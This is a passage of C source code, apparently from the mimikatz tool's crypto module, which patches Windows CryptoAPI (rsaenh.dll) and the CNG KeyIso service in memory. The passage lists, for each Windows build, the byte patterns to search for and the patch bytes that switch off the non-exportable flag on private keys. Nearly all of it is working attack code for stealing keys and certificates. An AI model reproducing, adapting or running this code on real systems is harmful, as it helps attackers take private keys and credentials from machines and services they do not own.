		aPattern4001Memory.address = currentReference4001->Search.Pattern;
		aPattern4000Memory.address = currentReference4000->Search.Pattern;
		aPatchMemory.address = currentReference4001->Patch.Pattern;

		if(kull_m_process_getVeryBasicModuleInformationsForName(&hLocalMemory, L"rsaenh.dll", &iModuleRsaEnh))
		{
			sMemory.kull_m_memoryRange.size = iModuleRsaEnh.SizeOfImage - ((PBYTE) K_CPExportKey - (PBYTE) iModuleRsaEnh.DllBase.address);
		
			if(	kull_m_patch(&sMemory, &aPattern4001Memory, currentReference4001->Search.Length, &aPatchMemory, currentReference4001->Patch.Length, currentReference4001->Offsets.off0, NULL, 0, NULL, NULL)	&&
				kull_m_patch(&sMemory, &aPattern4000Memory, currentReference4000->Search.Length, &aPatchMemory, currentReference4001->Patch.Length, currentReference4000->Offsets.off0, NULL, 0, NULL, NULL)	)
				kprintf(L"Local CryptoAPI patched\n");
			else
				PRINT_ERROR_AUTO(L"kull_m_patch");

		} else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
	}					
	return STATUS_SUCCESS;
}

BYTE PATC_WALL_SPCryptExportKey_EXPORT[]	= {0xeb};
#ifdef _M_X64
BYTE PTRN_WI60_SPCryptExportKey[]			= {0xf6, 0x43, 0x28, 0x02, 0x0f, 0x85};
BYTE PTRN_WNO8_SPCryptExportKey[]			= {0xf6, 0x43, 0x28, 0x02, 0x75};
BYTE PTRN_WI80_SPCryptExportKey[]			= {0xf6, 0x43, 0x24, 0x02, 0x75};
BYTE PTRN_WI81_SPCryptExportKey[]			= {0xf6, 0x46, 0x24, 0x02, 0x75};
BYTE PATC_WI60_SPCryptExportKey_EXPORT[]	= {0x90, 0xe9};
KULL_M_PATCH_GENERIC CngReferences[] = {
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_SPCryptExportKey),	PTRN_WI60_SPCryptExportKey},	{sizeof(PATC_WI60_SPCryptExportKey_EXPORT), PATC_WI60_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WNO8_SPCryptExportKey),	PTRN_WNO8_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI81_SPCryptExportKey),	PTRN_WI81_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
};
#elif defined _M_IX86
BYTE PTRN_WNO8_SPCryptExportKey[]			= {0xf6, 0x41, 0x20, 0x02, 0x75};
BYTE PTRN_WI80_SPCryptExportKey[]			= {0xf6, 0x47, 0x1c, 0x02, 0x75};
BYTE PTRN_WI81_SPCryptExportKey[]			= {0xf6, 0x43, 0x1c, 0x02, 0x75};
KULL_M_PATCH_GENERIC CngReferences[] = {
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_SPCryptExportKey),	PTRN_WNO8_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI81_SPCryptExportKey),	PTRN_WI81_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
};
#endif
NTSTATUS kuhl_m_crypto_p_cng(int argc, wchar_t * argv[])
{
	NCRYPT_PROV_HANDLE hProvider;
	if(kuhl_m_crypto_hNCrypt)
	{
		if(NT_SUCCESS(K_NCryptOpenStorageProvider(&hProvider, NULL, 0)))
		{
			K_NCryptFreeObject(hProvider);
			kull_m_patch_genericProcessOrServiceFromBuild(CngReferences, ARRAYSIZE(CngReferences), L"KeyIso", (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"ncrypt.dll" : L"ncryptprov.dll", TRUE);
		}
	}
	else PRINT_ERROR(L"No CNG\n");
	return STATUS_SUCCESS;
}